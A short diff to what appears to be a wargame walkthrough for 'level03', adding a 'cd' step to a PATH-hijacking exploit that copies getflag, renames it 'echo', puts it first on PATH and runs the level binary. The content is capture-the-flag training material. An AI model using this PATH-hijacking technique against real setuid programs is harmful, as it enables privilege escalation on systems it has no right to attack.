@@ -19,6 +19,7 @@
 
     mkdir /tmp/test
     cp /bin/getflag /tmp/test
+    cd /tmp/test
     mv getflag echo
     export PATH=/tmp/test:$PATH
     ./level03
